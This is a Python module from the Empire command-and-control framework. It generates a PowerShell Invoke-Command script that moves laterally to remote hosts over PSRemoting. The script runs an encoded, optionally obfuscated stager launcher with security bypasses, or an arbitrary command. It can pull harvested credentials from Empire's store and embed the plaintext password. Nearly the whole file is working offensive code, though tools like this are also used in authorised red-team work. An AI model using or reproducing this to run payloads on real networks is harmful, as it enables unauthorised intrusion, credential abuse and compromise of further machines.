from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        command = params["Command"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        script = """Invoke-Command """

        # Only "Command" or "Listener" but not both
        if listener_name == "" and command == "":
            raise ModuleValidationException("Listener or Command required")
        if listener_name and command:
            raise ModuleValidationException(
                "[!] Cannot use Listener and Command at the same time"
            )

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid!")

                params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
                params["Password"] = cred.password

        if (
            not main_menu.listenersv2.get_active_listener_by_name(listener_name)
            and not command
        ):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        if listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            if launcher == "":
                raise ModuleValidationException("Error creating launcher")

        else:  # else command
            launcher = command.replace('"', '`"')

        # build the PSRemoting execution string
        computer_names = '"' + '","'.join(params["ComputerName"].split(",")) + '"'
        script += " -ComputerName @(" + computer_names + ")"
        script += " -ScriptBlock {" + launcher + "}"

        if params["UserName"] != "" and params["Password"] != "":
            # add in the user credentials
            script = (
                '$PSPassword = "'
                + params["Password"]
                + '" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential("'
                + params["UserName"]
                + '",$PSPassword);'
                + script
                + " -Credential $Credential"
            )

        script += ";'Invoke-PSRemoting executed on " + computer_names + "'"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
